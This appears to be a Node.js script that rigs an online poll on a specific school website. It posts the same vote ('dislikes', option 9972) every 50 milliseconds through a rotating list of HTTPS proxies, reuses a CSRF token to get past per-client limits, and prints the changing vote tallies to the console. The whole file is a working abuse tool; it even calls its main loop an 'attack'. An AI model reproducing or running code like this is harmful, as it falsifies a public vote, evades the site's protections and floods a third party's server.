const request = require('request-promise');
const fs = require('fs');

var total = 0, submitted = 0, dislikes = 0, likes = 0, last_dislikes = 0, last_likes = 0;

const proxies = fs.readFileSync('./proxy-https.txt').toString().split('\n');
const csrf = '';

const getResponse = async (proxy) => {
    return await request.post('https://lyceum.schools.by/polls/vote/3233', {
        headers: {
            'X-CSRFToken': csrf,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://lyceum.schools.by',
            'Referer': 'https://lyceum.schools.by',
            'Cookie': 'csrftoken=' + csrf
        },
        formData: {
            'csrfmiddlewaretoken': csrf,
            'option_id': '9972'
        },
        proxy: proxy,
        json: true
    }).catch(() => { });
};

setInterval(() => {
    console.clear();
    console.log(`total     : ${total}\nsubmitted : ${submitted}\ndislikes  : ${dislikes} - ${(dislikes * 100 / total).toFixed(2)}%${last_dislikes != 0 ? ` (+${dislikes - last_dislikes} since last check)` : ''}\nlikes     : ${likes} - ${(likes * 100 / total).toFixed(2)}%${last_likes != 0 ? ` (+${likes - last_likes} since last check)` : ''}`);
    last_dislikes = dislikes;
    last_likes = likes;
}, 1000);

const startAttackWithProxy = (proxy) => {
    setInterval(async () => {
        var response = await getResponse(proxy);
    
        if (response == null || response.total == null)
            return;
    
        try {
            total = Math.max(total, response.total);
            likes = Math.max(likes, response.options.find(item => item.pk == 9971).fields.count); // ahahahhah async programming ahahahahah (js has no c# object locks)
            dislikes = Math.max(dislikes, response.options.find(item => item.pk == 9972).fields.count); 
            submitted++;
        }
        catch { }
        finally {
            response = null;
        }
    }, 50);
}

startAttackWithProxy();
proxies.forEach(proxy => {
    startAttackWithProxy(proxy);
});